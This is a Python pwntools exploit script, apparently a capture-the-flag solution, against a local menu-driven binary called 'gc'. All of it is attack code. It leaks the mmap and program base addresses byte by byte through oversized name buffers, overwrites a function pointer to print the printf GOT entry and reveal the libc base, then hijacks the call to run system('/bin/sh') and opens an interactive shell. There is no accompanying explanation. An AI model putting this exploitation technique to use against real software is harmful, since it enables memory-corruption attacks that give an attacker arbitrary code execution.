from pwn import *
binary = './gc'
context.arch = 'amd64'
context.log_level= 'debug'

elf = ELF(binary)
libc = [x for x in elf.libs.keys() if 'libc.so' in x]
libc = ELF(libc and libc[0] or './libc.so.6')

system_offset = libc.symbols['system']
printf_offset = libc.symbols['printf']
binsh_offset = list(libc.search('/bin/sh\x00'))[0]

c = process(binary)
    
def addegg():
    c.sendlineafter(':\n','1')

def addbox(size):
    c.sendlineafter(':\n','2')
    c.sendlineafter(':\n',str(size))

def storebox():
    c.sendlineafter(':\n','3')

def deliver(idx):
    c.sendlineafter(':\n','5')
    c.sendlineafter('box: \n',str(idx))

def givename(l,name):
    c.sendlineafter('length:\n',str(l))
    c.sendlineafter(':\n',name)

def dolist():
    c.sendlineafter(':\n','6')

leak = ''
for i in range(16):
    addbox(0)
    storebox()
    givename(3,'a')
    deliver(0)
    addbox(0)
    storebox()
    givename(0x100000-56*2-8-8,'a')
    deliver(0)
    
    addbox(0)
    storebox()
    givename(0x100000-56-8,'a')
    deliver(0)
    
    addbox(0)
    storebox()
    pre = 'a'*(16+i)
    givename(0x100000-56-8,pre)
    c.sendlineafter(':\n','5')
    t = c.recvuntil('box: \n')
    ch = t[t.find(pre)+len(pre):][:1]
    leak+=ch
    print '---'
    print ord(ch)
    c.sendline('0')
    
    addbox(0)
    storebox()
    givename(0x100000-56-8,'a')
    deliver(0)

print leak
mmap_addr = u64(leak[:8])-0x43
base_addr = u64(leak[8:16])-0x1a30
print 'mmap',hex(mmap_addr)
print 'base',hex(base_addr)

printf_addr = base_addr+elf.plt['printf']

addbox(0)
storebox()
givename(3,'a')
deliver(0)
addbox(0)
storebox()
args_addr=base_addr+elf.got['printf']-(mmap_addr+0x90)
args_addr=args_addr&0xffffffffffffffff
#print hex(args_addr)
givename(0x100000-56*2-8-8,'z'*40+p64(printf_addr)+p64(args_addr))
deliver(0)

addbox(0)
storebox()
givename(0x100000-56-8,'a')
deliver(0)

addbox(0)
storebox()
givename(3,'b')
addbox(0)
addegg()
storebox()
givename(3,'a')
addegg()
#gdb.attach(proc.pidof(c)[0])
c.sendlineafter(':\n','5')
t = c.recvuntil('box: \n')
pl=t.find('$ 1')
pr=t.find('$ 2')
leak2 = t[pl+22:pr]
print leak2.encode('hex')
libc_base = u64(leak2.ljust(8,'\x00'))-printf_offset
print 'libc',hex(libc_base)
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
c.sendline('0')
deliver(0)
deliver(0)
# no gc
addbox(0)
storebox()
givename(0x100000-0xa0-56-8,'a')
deliver(0)
#gdb.attach(proc.pidof(c)[0])

addbox(1)
storebox()
givename(0x100000-0x70-8-8,'a')
deliver(0)

addbox(0)
storebox()
givename(3,'a')
deliver(0)
addbox(0)
storebox()
args_addr=binsh_addr-(mmap_addr+0x90)
args_addr=args_addr&0xffffffffffffffff
givename(0x100000-56*2-8-8,'z'*40+p64(system_addr)+p64(args_addr))
deliver(0)

addbox(0)
storebox()
givename(0x100000-56-8,'a')
deliver(0)

addbox(0)
storebox()
givename(3,'b')
addbox(0)
addegg()
storebox()
givename(3,'a')
addegg()
#gdb.attach(proc.pidof(c)[0])
c.sendlineafter(':\n','5')

c.interactive()
